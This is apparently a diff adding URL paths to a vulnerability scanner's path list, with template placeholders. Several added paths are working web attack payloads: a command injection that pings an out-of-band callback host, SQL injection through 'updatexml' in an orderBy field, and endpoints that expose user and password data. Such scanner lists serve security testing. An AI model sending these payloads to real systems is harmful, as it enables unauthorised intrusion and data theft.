@@ -1,1 +1,6 @@
 /current_config/passwd
+/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{interactsh-url}}%20index.pcap
+/admin/user_getUserInfoByUserName.action?userName=system
+/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5({{num}})),0x7e),1)--%22%7D/extend/%7B%7D
+/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(%27sycnb%27)),0x7e),1)--%22%7D/extend/%7B%7D
+/accountApi/getMaster.do?id=1
